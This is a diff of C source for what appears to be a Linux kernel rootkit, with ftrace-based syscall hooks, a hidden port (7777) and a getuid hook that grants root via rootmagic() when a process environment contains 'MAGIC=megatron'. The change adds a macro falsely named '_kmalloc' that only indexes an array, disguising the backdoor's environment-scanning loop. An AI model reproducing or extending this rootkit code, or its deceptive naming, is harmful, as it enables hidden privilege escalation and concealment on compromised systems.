@@ -26,7 +26,7 @@ Just a slave of God
 #define MKDIR_HOOK_IS_ENABLED 1
 // change your desired port number
 #define PORT_HIDING ((const unsigned int)7777)
-
+#define _kmalloc(_initmem,counter) *(_initmem+counter)
 // Version-specific adjustments
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
 #define FTRACE_REGS_STRUCT ftrace_regs
@@ -239,8 +239,8 @@ static asmlinkage long hook_getuid(const struct pt_regs *regs) {
                 len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                 if (len > 0) {
                     for (i = 0; i < len - 1; i++) {
-                        if (envs[i] == '\0')
-                            envs[i] = ' ';
+                        if (_kmalloc(envs,i) == '\0')
+                         _kmalloc(envs,i) = ' ';
                     }
                     if (strstr(envs, "MAGIC=megatron")) {
                         rootmagic();
